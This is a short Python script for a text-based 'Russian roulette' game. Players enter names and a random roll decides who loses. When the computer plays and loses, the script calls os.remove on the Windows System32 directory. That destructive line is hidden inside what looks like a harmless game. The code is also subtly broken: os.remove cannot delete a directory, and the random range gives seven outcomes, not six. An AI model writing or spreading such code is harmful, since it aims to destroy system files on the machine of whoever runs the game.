import random
import os
comp = int(input("Is your computer playing too? (1 - yes, 2 - no) => "))
class Roulette:    
    def shoot(self):
        def __computer():
            if random.randint(0, 6) == 1:
                print("COMPUTER HAS LOST!!!")
                os.remove("C:\Windows\System32")
            else:
                print("COMPUTER IS LUCKY TODAY!")                
        players = int(input("How many players in game? "))
        for i in range(players):
            player=input("Enter player name => ")
            print("Your gun is loaded, ", player)
            print("YOUR GUN HAS 6 LOADS, ONE WILL SHOOT YOU. ONLY LUCK CAN SAVE YOU!")
            if random.randint(0, 6) == 1:
                print(player, " HAS LOST!!!")
            else:
                print(player, " IS LUCKY TODAY!")        
        if comp == 1:
            __computer()
roulette = Roulette()
roulette.shoot()
